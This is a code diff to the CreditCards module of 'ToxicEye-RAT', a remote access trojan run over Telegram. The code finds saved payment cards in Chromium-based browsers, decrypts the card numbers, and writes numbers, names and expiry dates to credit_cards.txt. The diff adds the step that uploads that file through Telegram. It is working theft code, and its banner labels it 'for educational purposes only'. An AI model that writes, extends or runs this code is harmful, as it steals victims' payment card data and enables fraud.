@@ -1,13 +1,12 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
 
 using System;
-using System.Collections.Generic;
 using System.IO;
 
 namespace TelegramRAT
@@ -15,8 +14,7 @@ namespace TelegramRAT
     internal class CreditCards
     {
 
-        // Return list with arrays (number, expYear, expMonth, name)
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
@@ -51,9 +49,10 @@ namespace TelegramRAT
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<Dictionary<string, string>> creditcards = new List<Dictionary<string, string>>();
             // Database
             string tempCCLocation = "";
+            string filename = "credit_cards.txt";
+            string output = "[CREDIT CARDS]\n\n";
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -88,20 +87,19 @@ namespace TelegramRAT
                         break;
                     }
 
-
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
-                    {
-                        ["number"] = Crypt.decryptChrome(number, browser),
-                        ["expireYear"] = expYear,
-                        ["expireMonth"] = expMonth,
-                        ["name"] = Crypt.toUTF8(name)
-                    };
-                    creditcards.Add(credentials);
+                    // Add
+                    output += "NUMBER: " + Crypt.decryptChrome(number, browser) + "\n"
+                           + "NAME: " + Crypt.toUTF8(name) + "\n"
+                           + "EXPIRE_YEAR: " + expYear + "\n"
+                           + "EXPIRE_MONTH: " + expMonth + "\n"
+                           + "\n";
                     continue;
                 }
                 continue;
             }
-            return creditcards;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
